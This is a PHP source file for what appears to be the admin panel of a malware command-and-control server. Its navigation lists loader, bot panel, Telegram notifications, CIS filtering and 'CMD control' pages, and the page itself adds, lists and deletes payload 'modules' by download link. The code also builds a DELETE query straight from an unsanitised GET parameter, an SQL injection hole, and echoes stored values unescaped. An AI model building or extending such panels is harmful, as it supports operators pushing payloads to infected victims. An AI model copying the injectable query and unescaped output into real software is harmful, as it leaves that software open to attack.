<?php
session_start();
include('protect.php');

$myevent = $_GET['delete'];
$myeventname = $_GET['name'];

if($myevent == "1"){
    mysqli_query($mysqli, "DELETE FROM `modules` WHERE `name`='" . $myeventname . "'");
    refresh();
}

function refresh()
{
    ?>
    <script>
        document.location.href = "/modules.php";
    </script>
    <?php
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Modules</title>

    <!-- Bootstrap -->

    <link href="css/style_table.css" rel="stylesheet">
    <link href="css/bootstrap.css" rel="stylesheet">
    <link href="css/bootstrap-theme.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>

    <script src="js/bootstrap.js"></script>
    <style>[class="cbalink"]{display:none;}</style>
</head>
<body style = "background-color: #ffffff">
<nav class="navbar navbar-inverse";">

<div class="container-fluid" style = "background-color: #ffffff">
    <ul class="nav navbar-nav">
        <li><a href="loader.php" style="color: black">Loader</a></li>
        <li><a href="table.php" style="color: black">Panel</a></li>
        <li><a href="Countries.php" style="color: black">Statistic</a></li>
        <li><a href="telegram.php" style="color: black">Telegram Notifications</a></li>
        <li><a href="cis.php" style="color: black">CIS</a></li>
        <li><a href="comma.php" style="color: black">CMD control</a></li>
        <li><a href="logout.php" style="color: black">Logout</a></li>

    </ul>
</div>
</nav>
<div class="container">
    <div class="row">
        <form method="POST" action="">
            <div class="form-group">
                <form method="POST" action="">
                    <input name="mname" value="Module name" type="text">
                    <input name="mlink" value="Link" type="text">
                    <input type="submit" class="btn btn-primary" name="send" value="Add">
            </div>
        </form>
        <?php
        if(isset($_POST['send']))
        {
            $check = mysqli_query($mysqli, "SELECT * FROM `modules`");

            mysqli_query($mysqli, "INSERT INTO `modules` SET `name`='" . mysqli_real_escape_string($mysqli, $_POST['mname']) . "', `link`='" . mysqli_real_escape_string($mysqli, $_POST['mlink']) . "'");
            refresh();
        }
        ?>
    </div>
    <br>
    <table class="table table-bordered">
        <thead>
        <tr>
            <th style="color: black">Name</th>
            <th style="color: black">Link</th>
            <th style="color: black">Operation</th>
        </tr>
        </thead>
        <tbody>
        <?php
        $workers = mysqli_query($mysqli, "SELECT * FROM `modules`");

        for ($i = 0; $i < mysqli_num_rows($workers); $i++)
        {
            $curr = mysqli_fetch_assoc($workers);
            $curname = $curr['name'];

            echo
                "
                            <tr style=\"background-color: #ffffff; opacity: 0.9;\">
                            
                            <td><strong>".$curname."</strong></td>
                            <td><strong>".$curr['link']."</strong></td>
                            <td><a href='/modules.php?delete=1&name=$curname' value='Delete' type='submit' class='btn btn-primary'>Delete</a></td>
                            </tr>
                            ";
        }
        ?>
        </tbody>
    </table>
</div>

<?php
mysqli_close($mysqli);
?>
</body>
</html>